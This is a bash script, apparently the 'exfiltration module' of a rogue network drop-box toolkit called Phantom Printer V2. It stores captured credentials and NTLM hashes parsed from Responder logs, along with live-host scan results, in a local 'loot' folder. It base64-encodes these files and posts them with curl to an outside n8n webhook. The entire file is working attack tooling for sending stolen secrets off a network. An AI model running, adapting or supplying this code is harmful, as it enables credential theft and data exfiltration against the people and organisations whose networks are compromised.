#!/bin/bash
#================================================================
# PHANTOM PRINTER V2 - EXFIL MODULE
# Data exfiltration via multiple channels
#================================================================

set -e

# Source configuration
CONFIG_FILE="/home/kali/dropbox-v2/config/dropbox.conf"
if [[ -f "$CONFIG_FILE" ]]; then
    source "$CONFIG_FILE"
fi

# Directories
LOOT_DIR="/home/kali/dropbox-v2/loot"
LOG_FILE="/home/kali/dropbox-v2/logs/exfil.log"

mkdir -p "$LOOT_DIR/creds" "$LOOT_DIR/hashes" "$LOOT_DIR/scans" "$LOOT_DIR/exfil" "$(dirname "$LOG_FILE")"

# Defaults
N8N_WEBHOOK_URL="${N8N_WEBHOOK_URL:-}"
DROPBOX_ID="${DROPBOX_ID:-phantom-001}"

# Log function
log() {
    local msg="[$(date '+%Y-%m-%d %H:%M:%S')] [EXFIL] $1"
    echo "$msg" | tee -a "$LOG_FILE"
}

# Send data to n8n webhook
exfil_webhook() {
    local loot_type="$1"
    local source="$2"
    local data="$3"
    
    if [[ -z "$N8N_WEBHOOK_URL" ]]; then
        log "No webhook URL configured"
        return 1
    fi
    
    local webhook_url="${N8N_WEBHOOK_URL}/webhook/dropbox-loot"
    
    # Truncate data if too large (max 100KB for webhook)
    if [[ ${#data} -gt 102400 ]]; then
        data="${data:0:102400}... [TRUNCATED]"
    fi
    
    local payload=$(cat << EOF
{
    "dropbox_id": "$DROPBOX_ID",
    "type": "$loot_type",
    "source": "$source",
    "data": $(echo -n "$data" | jq -Rs .),
    "timestamp": "$(date -Iseconds)"
}
EOF
)
    
    curl -s -X POST "$webhook_url" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        --max-time 60 2>/dev/null
    
    if [[ $? -eq 0 ]]; then
        log "Exfiltrated $loot_type from $source via webhook"
        return 0
    else
        log "Webhook exfil failed for $loot_type"
        return 1
    fi
}

# Exfil file via webhook
exfil_file() {
    local file="$1"
    local loot_type="${2:-file}"
    
    if [[ ! -f "$file" ]]; then
        log "File not found: $file"
        return 1
    fi
    
    local filename=$(basename "$file")
    local data=$(base64 -w 0 "$file")
    
    exfil_webhook "$loot_type" "$filename" "$data"
}

# Store credentials locally
store_creds() {
    local source="$1"
    local username="$2"
    local password="$3"
    local extra="${4:-}"
    
    local creds_file="$LOOT_DIR/creds/credentials.txt"
    
    echo "[$(date -Iseconds)] $source | $username : $password $extra" >> "$creds_file"
    
    log "Stored credentials from $source"
    
    # Also exfil via webhook
    exfil_webhook "credentials" "$source" "$username:$password"
}

# Store hashes locally
store_hash() {
    local source="$1"
    local hash="$2"
    local hash_type="${3:-unknown}"
    
    local hash_file="$LOOT_DIR/hashes/${hash_type}-hashes.txt"
    
    echo "$hash" >> "$hash_file"
    
    log "Stored $hash_type hash from $source"
    
    # Also exfil via webhook
    exfil_webhook "hash" "$source" "$hash"
}

# Parse and store Responder logs
parse_responder() {
    local responder_log="${1:-/usr/share/responder/logs}"
    
    if [[ ! -d "$responder_log" ]]; then
        log "Responder log directory not found"
        return 1
    fi
    
    log "Parsing Responder logs..."
    
    # Find hash files
    for hashfile in "$responder_log"/*NTLM*.txt "$responder_log"/*NTLMv2*.txt; do
        if [[ -f "$hashfile" ]]; then
            local hash_type=$(basename "$hashfile" | grep -oE 'NTLMv?[12]?' || echo "NTLM")
            while read -r hash; do
                store_hash "responder" "$hash" "$hash_type"
            done < "$hashfile"
        fi
    done
    
    log "Responder parsing complete"
}

# Exfil all loot
exfil_all() {
    log "=== EXFILTRATING ALL LOOT ==="
    
    # Exfil credentials
    if [[ -f "$LOOT_DIR/creds/credentials.txt" ]]; then
        exfil_file "$LOOT_DIR/creds/credentials.txt" "credentials"
    fi
    
    # Exfil hashes
    for hashfile in "$LOOT_DIR/hashes"/*.txt; do
        if [[ -f "$hashfile" ]]; then
            exfil_file "$hashfile" "hashes"
        fi
    done
    
    # Exfil scan results (just summaries)
    if [[ -f "$LOOT_DIR/scans/live-hosts.txt" ]]; then
        local hosts=$(cat "$LOOT_DIR/scans/live-hosts.txt" | tr '\n' ', ')
        exfil_webhook "scan_results" "live-hosts" "$hosts"
    fi
    
    log "=== EXFILTRATION COMPLETE ==="
}

# Show loot status
show_status() {
    echo "=== LOOT STATUS ==="
    echo ""
    echo "Credentials:"
    if [[ -f "$LOOT_DIR/creds/credentials.txt" ]]; then
        wc -l < "$LOOT_DIR/creds/credentials.txt" | xargs echo "  Count:"
    else
        echo "  None"
    fi
    echo ""
    
    echo "Hashes:"
    for hashfile in "$LOOT_DIR/hashes"/*.txt; do
        if [[ -f "$hashfile" ]]; then
            local name=$(basename "$hashfile")
            local count=$(wc -l < "$hashfile")
            echo "  $name: $count"
        fi
    done
    [[ ! -f "$LOOT_DIR/hashes"/*.txt ]] && echo "  None"
    echo ""
    
    echo "Scans:"
    ls -lh "$LOOT_DIR/scans"/*.txt 2>/dev/null || echo "  None"
    echo ""
    
    echo "Total loot size: $(du -sh "$LOOT_DIR" 2>/dev/null | cut -f1)"
}

# Main
case "${1:-}" in
    webhook)
        exfil_webhook "${2:-test}" "${3:-manual}" "${4:-test data}"
        ;;
    file)
        exfil_file "$2" "${3:-file}"
        ;;
    creds)
        store_creds "${2:-manual}" "$3" "$4" "$5"
        ;;
    hash)
        store_hash "${2:-manual}" "$3" "${4:-unknown}"
        ;;
    responder)
        parse_responder "$2"
        ;;
    all)
        exfil_all
        ;;
    status)
        show_status
        ;;
    *)
        echo "Usage: $0 {webhook|file|creds|hash|responder|all|status}"
        echo ""
        echo "Commands:"
        echo "  webhook <type> <source> <data>  - Send data via webhook"
        echo "  file <path> [type]              - Exfil file via webhook"
        echo "  creds <source> <user> <pass>    - Store credentials"
        echo "  hash <source> <hash> [type]     - Store hash"
        echo "  responder [path]                - Parse Responder logs"
        echo "  all                             - Exfil all loot"
        echo "  status                          - Show loot status"
        exit 1
        ;;
esac

exit 0
